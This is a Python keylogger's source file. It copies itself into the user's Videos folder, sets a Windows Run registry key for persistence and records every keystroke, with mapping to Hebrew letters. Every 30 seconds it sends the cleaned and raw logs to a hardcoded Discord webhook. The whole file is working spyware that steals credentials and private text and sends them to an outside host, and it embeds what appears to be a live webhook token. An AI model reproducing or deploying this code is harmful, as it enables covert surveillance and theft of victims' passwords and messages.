import threading
from time import sleep
import keyboard
import os
from distutils.dir_util import copy_tree
from discord_webhook import DiscordWebhook
from discord_webhook import DiscordEmbed
import random
import subprocess
try:
    cmd = subprocess.run("whoami", capture_output=True,shell=True,timeout=30)
    out=cmd.stdout.decode()
    out = out.replace("\n","")
except Exception as e:
    print(e)
print("next")
try:
    userprof = os.getenv('userprofile')
    Currentpath = os.getcwd().strip('/n')
    print(Currentpath)
    print(userprof)
    destination = userprof.strip('\n\r') + '\\Videos\\'
    print(destination)
    if not os.path.exists(destination):
        os.mkdir(destination)
        copy_tree(Currentpath,destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'THING', 0, wreg.REG_SZ,destination + 'loop_keylogger.exe')
        key.Close()
        os.chdir(destination)
        command = "dir"
        print("this is dir output")
        cmd = subprocess.run(command, capture_output=True, shell=True)
        print(cmd.stdout.decode())
        print(cmd.stderr.decode())
    else:
        print("got here somehow")
        copy_tree(Currentpath,destination)
        os.chdir(destination)
except Exception as e:
    print(e)

to_send = "a"
raw_to_send = "a"
final_to_send = "a"
my_color = "%06x" % random.randint(0, 0xFFFFFF)
eng_to_heb = {"a":"ש","b":"נ","c":"ב","d":"ג","e":"ק","f":"כ","g":"ע","h":"י","i":"ן","j":"ח","k":"ל","l":"ך","m":"צ","n":"מ","o":"ם","p":"פ","q":"/","r":"ר","s":"ד","t":"א","u":"ו","v":"ה","w":"''","x":"ס","y":"ט","z":"ז","[":"[","]":"]",",":"ת"}
hebrew = False
def main_send():
    global to_send
    global raw_to_send
    while True:
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/974299857604993155/cK2VG_z1_tazQR5joSpe5PyE1EZlBO7FB-yrU2-Pt_dDt6ZW89y1_zW2fpaUauoqtGH9')
        embed = DiscordEmbed(title=f'keylogger data [{out}]', description=f"cleaned data from the keylogger, could be buggy so we have the raw data as backup", color=my_color)
        embed.add_embed_field(name="Data",value=f"\n {to_send} \n ",inline=True)
        webhook.add_embed(embed)
        response = webhook.execute()
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/974299857604993155/cK2VG_z1_tazQR5joSpe5PyE1EZlBO7FB-yrU2-Pt_dDt6ZW89y1_zW2fpaUauoqtGH9')
        webhook.add_file(raw_to_send, filename='raw.txt')
        response = webhook.execute()
        sleep(30)
main_send_thread = threading.Thread(target=main_send)
main_send_thread.start()

logs = []
def constant_listening():
    global logs
    keyboard.on_press(lambda e: appending(e))
    keyboard.wait()

def appending(key):
    global logs
    global to_send
    global raw_to_send
    logs.append(key)
    raw_to_send = str(logs)
    to_send = clean(logs)
    print(logs)

def clean(dirty):
    global hebrew
    clean = ""
    for key in dirty:
        if key.name == "space":
            clean += " "
            print("is space")
        elif key.name == "tab":
            clean += " \n  [tab] "

        elif (key.name == "alt" and dirty[dirty.index(key)-1].name == "shift") or (key.name == "shift" and dirty[dirty.index(key)-1].name == "alt"):
            clean += " \n [**LANGUAGE CHANGE!!! buggy!**] "
            hebrew = not hebrew
        elif key.name == "alt":
            clean += " [shift] "
        elif key.name == "ctrl":
            clean += " [ctrl] "
        elif key.name == "shift":
            clean += " [shift] "
        elif key.name == "enter":
            clean += " [enter] "
        elif key.name == "backspace":
            clean = clean[:-1]
        else:
            print(key.name)
            if not hebrew:
                clean += key.name
            else:
                try:
                    transliterated = eng_to_heb[key.name]
                    clean += transliterated
                    print(transliterated)
                except Exception as e:
                    print(str(e))
                    clean += key.name
    print(clean)
    return clean

constant_listening_thread = threading.Thread(target=constant_listening)
constant_listening_thread.start()
keyboard.wait()
